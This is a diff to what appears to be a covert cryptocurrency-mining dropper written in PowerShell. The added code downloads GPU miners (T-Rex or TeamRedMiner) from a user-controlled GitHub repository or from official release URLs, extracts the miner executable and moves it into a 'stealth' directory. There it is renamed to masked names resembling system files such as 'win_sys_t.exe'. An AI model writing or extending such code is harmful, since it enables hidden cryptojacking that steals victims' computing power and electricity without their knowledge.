@@ -175,10 +175,29 @@ try {
 if ($HasGpu -and -not (Test-Path $MaskedGpu)) {
     $GpuFile = if ($IsAmd -eq "false") { "win_sys_t.exe" } else { "win_sys_a.exe" }
     $RawGpuUrl = "https://github.com/$GithubUser/$RepoName/raw/main/$GpuFile"
+    
+    # Official Direct Fallbacks (if your GitHub upload failed)
+    $OfficialUrl = if ($IsAmd -eq "false") { 
+        "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip"
+    } else { 
+        "https://github.com/todxx/teamredminer/releases/download/v0.10.21/teamredminer-v0.10.21-win.zip"
+    }
+
     $result = Safe-Download -Url $RawGpuUrl -OutPath $MaskedGpu
     if (-not $result) {
-        $FallbackUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/$GpuFile"
-        Safe-Download -Url $FallbackUrl -OutPath $MaskedGpu | Out-Null
+        # If your repo fails, download zip, extract, and rename
+        $tmpZip = Join-Path $StealthDir "tmp.zip"
+        $tmpDir = Join-Path $StealthDir "tmp_ext"
+        if (Safe-Download -Url $OfficialUrl -OutPath $tmpZip) {
+            Expand-Archive -Path $tmpZip -DestinationPath $tmpDir -Force
+            $exeName = if ($IsAmd -eq "false") { "t-rex.exe" } else { "teamredminer.exe" }
+            $foundExe = Get-ChildItem -Path $tmpDir -Filter $exeName -Recurse | Select-Object -First 1
+            if ($foundExe) {
+                Move-Item $foundExe.FullName $MaskedGpu -Force
+                $result = $true
+            }
+            Remove-Item $tmpZip, $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
+        }
     }
 }
 
